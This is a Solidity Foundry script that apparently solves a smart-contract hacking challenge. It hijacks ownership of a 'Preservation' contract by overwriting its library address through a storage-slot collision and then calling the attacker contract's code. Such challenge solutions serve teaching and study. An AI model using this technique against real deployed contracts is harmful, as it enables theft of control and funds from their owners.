// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity 0.8.0;

import "forge-std/Script.sol";
import "../src/Attacker.sol";
import "../src/Contract.sol";
import "forge-std/console.sol";

contract AttackScript is Script {

    Attacker attacker;
    Preservation preservation = Preservation(0x1AFEC17e969A921025AB9455264670f01664d072);

    function setUp() public {
        vm.startBroadcast();
        attacker = new Attacker();
    }

    function run() public{
        //set preservation storage slot 0 to uint representation of attacker address
        preservation.setFirstTime(uint160(address(attacker)));

        require(preservation.timeZone1Library() == (address(attacker)), 'failed to set storage slot 0');
        
        // now call preservation.setFirstTime again so that the code in our attacker setTime(uint) can execute and change the preservation contract owner 
        preservation.setFirstTime(1);

        require(preservation.owner() == msg.sender, 'owner not changed');
    }
}
